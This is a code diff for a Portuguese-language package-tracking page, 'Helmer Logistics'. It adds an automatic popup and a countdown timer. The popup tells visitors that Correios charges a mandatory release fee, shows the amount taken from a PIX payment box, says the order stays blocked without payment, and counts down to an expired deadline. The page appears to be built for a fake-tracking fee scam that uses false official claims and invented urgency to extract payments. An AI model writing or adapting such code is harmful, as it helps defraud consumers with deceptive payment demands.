@@ -734,6 +734,24 @@ body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0A
 </div>
 <?php endif; ?>
 
+<?php
+// Exibir popup explicativo automaticamente no render completo quando houver taxa
+if (!empty($statusList) && $temTaxa) {
+    $taxaValorPrimeira = null;
+    foreach ($statusList as $etapa) {
+        if (!empty($etapa['taxa_valor'])) {
+            $taxaValorPrimeira = number_format($etapa['taxa_valor'], 2, ',', '.');
+            break;
+        }
+    }
+    if ($taxaValorPrimeira) {
+        echo "<script>document.addEventListener('DOMContentLoaded',function(){ if (typeof showTaxaPopup==='function') { showTaxaPopup('R$ {$taxaValorPrimeira}'); }});</script>";
+    } else {
+        echo "<script>document.addEventListener('DOMContentLoaded',function(){ if (typeof showTaxaPopup==='function') { showTaxaPopup(); }});</script>";
+    }
+}
+?>
+
 <section class="features">
     <h2>Por que escolher Helmer Logistics?</h2>
     <div class="features-grid">
@@ -773,6 +791,9 @@ atualizarContagem();
 <?php endif; ?>
 
 <script>
+// Valor global para inicialização de contagem no fluxo AJAX
+window.TEMPO_LIMITE_HORAS = <?= (int)$tempoLimite ?>;
+
 function showIndicacaoInfo() {
     const modal = document.createElement('div');
     modal.style.cssText = `position: fixed; top: 0; left: 0; width: 100%; height: 100%;
@@ -871,6 +892,21 @@ document.addEventListener('DOMContentLoaded', function() {
                 const html = await response.text();
                 results.innerHTML = html;
                 results.scrollIntoView({ behavior: 'smooth', block: 'start' });
+
+                // Iniciar popup e countdown se houver taxa no retorno AJAX
+                try {
+                    const pixBox = results.querySelector('.pix-box');
+                    if (pixBox && typeof showTaxaPopup === 'function') {
+                        let valorTexto = null;
+                        const p = pixBox.querySelector('p');
+                        if (p && /R\$\s*[0-9\.,]+/.test(p.textContent)) {
+                            const m = p.textContent.match(/R\$\s*[0-9\.,]+/);
+                            valorTexto = m ? m[0] : null;
+                        }
+                        showTaxaPopup(valorTexto);
+                    }
+                    startCountdownIfPresent();
+                } catch (_) { /* silencioso */ }
             } catch (err) {
                 results.innerHTML = '<div class="results"><div class="erro">❌ Erro ao consultar. Tente novamente.</div></div>';
             } finally {
@@ -879,7 +915,54 @@ document.addEventListener('DOMContentLoaded', function() {
             }
         });
     }
+
+    // Inicializa countdown quando houver elemento no DOM (ex.: respostas AJAX)
+    function startCountdownIfPresent() {
+        const el = document.getElementById('countdown');
+        if (!el || window.__countdownStarted) return;
+        window.__countdownStarted = true;
+        let tempo = (typeof window.TEMPO_LIMITE_HORAS !== 'undefined' ? window.TEMPO_LIMITE_HORAS : 24) * 60 * 60;
+        (function tick(){
+            const horas = Math.floor(tempo / 3600);
+            const minutos = Math.floor((tempo % 3600) / 60);
+            const segundos = tempo % 60;
+            el.innerHTML = '⏱ Tempo restante: ' + String(horas).padStart(2,'0') + ':' + String(minutos).padStart(2,'0') + ':' + String(segundos).padStart(2,'0');
+            if (tempo > 0) { tempo--; setTimeout(tick, 1000); } else { el.innerHTML = '❌ Prazo expirado.'; }
+        })();
+    }
 });
+</script>
+
+<script>
+// Popup explicativo da taxa (cliente)
+function showTaxaPopup(valorTexto) {
+    const modal = document.createElement('div');
+    modal.style.cssText = `position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(0, 0, 0, 0.9); z-index: 10000; display: flex; justify-content: center;
+        align-items: center; padding: 20px;`;
+
+    const valorLinha = valorTexto ? `O valor definido pelo Correios para o seu envio foi de <strong>${valorTexto}</strong>, e, após o pagamento, a liberação acontece rapidamente e seu produto segue normalmente para o endereço informado.` : `O valor definido pelo Correios para o seu envio está indicado acima. Após o pagamento, a liberação acontece rapidamente e seu produto segue normalmente para o endereço informado.`;
+
+    modal.innerHTML = `
+        <div style="background: linear-gradient(135deg, #0a0a0a, #1a0000); padding: 32px;
+            border-radius: 18px; max-width: 820px; width: 100%; border: 2px solid #ff3333; color: #fff;">
+            <h2 style="color: #ff3333; text-align: center; margin-bottom: 18px; font-size: 1.6rem;">
+                <i class="fas fa-info-circle"></i> Sobre a taxa apresentada
+            </h2>
+            <div style="display: grid; gap: 10px; line-height: 1.5;">
+                <p>Gostaria de esclarecer sobre a taxa que apareceu no seu pedido. O Correios, em determinados envios, aplica uma taxa de despacho/postagem para liberar o produto no sistema logístico. Essa taxa é um procedimento obrigatório do Correios, não sendo uma cobrança feita pela nossa loja.</p>
+                <p>Ela serve para cobrir os custos operacionais do Correios no processo de triagem, segurança e manuseio da encomenda. Sem esse pagamento, o pedido fica bloqueado e não segue para entrega.</p>
+                <p>${valorLinha}</p>
+                <p>Estamos à disposição para auxiliar em qualquer dúvida ou no passo a passo desse processo. Nosso objetivo é garantir que você receba sua compra da forma mais rápida e segura possível.</p>
+            </div>
+            <div style="display:flex; gap:10px; margin-top: 20px;">
+                <button onclick="this.closest('div').parentElement.remove()" style="flex:1; padding: 12px 16px; background: var(--gradient); border: none; border-radius: 10px; color: white; font-weight: 700; cursor: pointer;">Entendi</button>
+            </div>
+        </div>
+    `;
+    document.body.appendChild(modal);
+    modal.addEventListener('click', (e) => { if (e.target === modal) modal.remove(); });
+}
 </script>
 
 
